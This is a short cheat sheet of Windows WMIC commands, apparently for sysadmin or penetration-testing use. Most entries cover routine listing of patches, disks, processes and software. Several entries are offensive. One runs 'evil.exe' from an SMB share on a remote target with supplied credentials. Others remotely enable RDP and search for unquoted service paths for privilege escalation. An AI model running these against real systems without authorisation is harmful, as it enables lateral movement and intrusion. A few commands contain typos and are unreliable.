#wmic: lis all #updates
`wmic qfe`
`wmic qfe get Caption,Description,HotFixID,InsatalledOn`

#wmic: list all #disks
`wmic logicaldisk get caption,description,providername`

#wmic: list all #attributes  
`wmic [alias] get /?`
  
#wmic: callable #methods  
`wmic [alias] call /?`
  
#wmic: process #attributes  
`wmic process list full`
  
#wmic: starts wmic #service  
`wmic startupwmic service`  
  
#wmic: domain and #DC info  
`wmic ntdomain list`  
  
#wmic: list all #patches  
`wmic qfe`  
  
#wmic: execute #process  
`wmic process call create "process_name"`  
  
#wmic: terminate #process  
`wmic process where name="process" call terminate`  
  
#wmic: view logical #shares  
`wmic logicaldisk get description,name`  
  
#wmic: display 32 || 64 bit  
`wmic cpu get DataWidth /format:list`  
_alias: process, share, startup, service, niconfig, useraccount, etc._
  
#wmic: execute file hosted over SMB on remote system with specified #credential  
`wmic /node:<targetiP> /user:domain\user /password:password process call create "\\<smbiP>\share\evil.exe"`
  
#wmic: get #software names  
`wmic product get name /value`  
`wmic product where name="XXX" call uninstall /nointeractive`  
  
#wmic: remotely determine #logged in #user  
`wmic /node:remotecomputer computersystem get username`  
  
#wmic: remote process listing every second  
`wmic /node:machinename process list brief /every:1`  
  
#wmic: remotely start #RDP  
`wmic /node:"machinename 4" path Win32_TerminalServiceSetting where AllowTSConnections="0" call SetAllowTSConnections "1"`  
  
#wmic: list numbers of times user #logged in  
`wmic netlogin where (name like "%adm%") get numberoflogons`  
  
#wmic: search for services with #unquoted paths to binary  
`wmic service get name,displayname,pathname,startmode |findstr /i "auto" |findstr /i /v "c:\windows\\" |findstr /i /v """`